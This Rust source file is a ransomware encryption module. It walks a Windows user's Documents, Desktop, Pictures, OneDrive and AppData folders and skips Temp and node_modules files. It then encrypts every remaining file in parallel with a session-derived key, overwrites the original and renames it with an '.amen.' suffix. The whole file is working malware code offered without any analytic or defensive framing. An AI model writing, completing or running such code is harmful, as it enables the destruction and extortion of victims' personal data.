use std::fs::{self, File, ReadDir};
use std::io::{Read, Result, Write};
use std::path::{Path, PathBuf};

use rayon::prelude::*;
use regex::Regex;
use globset::{Glob, GlobSet, GlobSetBuilder};

use crate::win_api;
use crate::gen_str;
use crate::crypto::encrypt;
use crate::hash::hash;

const TARGETS: [&str; 20] = [
    "Contacts",
    "Desktop",
    "Documents",
    "Downloads",
    "Favorites",
    "Links",
    "Music",
    "Pictures",
    "Saved Games",
    "Searches",
    "Videos",
    "3D Objects",

    "OneDrive\\Desktop",
    "OneDrive\\Documents",
    "OneDrive\\Pictures",
    "OneDrive\\Music",
    "OneDrive\\Attachments",

    "AppData\\Roaming",
    "AppData\\Local",
    "AppData\\LocalLow"
];

const BLACKLISTED_CONTAINS: [&str; 2] = [
    "AppData\\Local\\Microsoft\\Linux",
    "AppData\\Local\\Temp"
];

const BLACKLISTED_PATTERNS: [&str; 7] = [
    "**\\node_modules\\*.js",
    "**\\node_modules\\*.ts",
    "**\\node_modules\\*.map",
    "**\\node_modules\\*.mjs",
    "**\\node_modules\\*.cjs",
    "**\\node_modules\\*.mts",
    "**\\node_modules\\*.cts",
];

pub fn start(session: &str) {
    let paths: Vec<String> = get_paths();
    let mut all_files: Vec<String> = Vec::new();

    for dir in paths {
        let path: &Path = Path::new(&dir);
        if !path.exists() {
            continue;
        }

        get_files(path, &mut all_files);
    }

    let blacklisted_patterns: GlobSet = get_blacklisted_patterns();

    let filtered: Vec<String> = all_files
        .into_iter()
        .filter(|path| {
            !BLACKLISTED_CONTAINS.iter().any(|a| path.contains(a)) &&
            !blacklisted_patterns.is_match(path)
        })
        .collect(); 

    filtered
        .par_iter()
        .for_each(|path| {

        let _ = encrypt_file(path, session);
    });
}

fn get_paths() -> Vec<String> {
    let name = match win_api::get_name() {
        Some(res) => res,
        None => "Default".to_string(),
    };

    TARGETS
        .iter()
        .map(|dir| format!("C:\\Users\\{}\\{}", name, dir))
        .collect()
}

fn get_files(path: &Path, save: &mut Vec<String>) {
    let items: ReadDir = match fs::read_dir(path) {
        Ok(item) => item,
        Err(_) => return,
    };

    for item in items.flatten() {
        let path: PathBuf = item.path();

        if path.is_dir() {
            get_files(&path, save);
            continue;
        }

        if !path.is_file() {
            continue;
        }

        if let Some(path_str) = path.to_str() {
            save.push(path_str.to_string());
        }
    }
}

fn get_blacklisted_patterns() -> GlobSet {
    let mut builder: GlobSetBuilder = GlobSetBuilder::new();

    BLACKLISTED_PATTERNS
        .iter()
        .filter_map(|str| Glob::new(str).ok())
        .for_each(|glob| {builder.add(glob);});

    builder
        .build()
        .unwrap_or_else(|_| GlobSetBuilder::new()
            .build()
            .unwrap()
        )
}

fn encrypt_file(path: &str, session: &str) -> Result<()> {
    let path: &Path = Path::new(path);

    let path_str: &str = match path.to_str() {
        Some(str) => str,
        None => return Ok(())
    };

    let pattern: Regex = Regex::new(r"\.amen\.[A-Za-z0-9]{6}$").unwrap();
    if pattern.is_match(path_str) {
        return Ok(());
    }

    let suffix: String = gen_str(6);
    let key: String = format!("{}{}", suffix, session);

    let mut file: File = File::open(&path)?;
    let mut content: String = String::new();
    file.read_to_string(&mut content)?;

    let encrypted: String = match encrypt(&content, &hash(&key)) {
        Ok(res) => res,
        Err(_) => return Ok(())
    };

    let mut new_file: File = File::create(&path)?;
    new_file.write_all(encrypted.as_bytes())?;

    let new_path: PathBuf = path.with_file_name(format!("{}.amen.{}",
        path
            .file_name()
            .unwrap()
            .to_string_lossy(),

        suffix
    ));

    fs::rename(path, new_path)?;

    Ok(())
}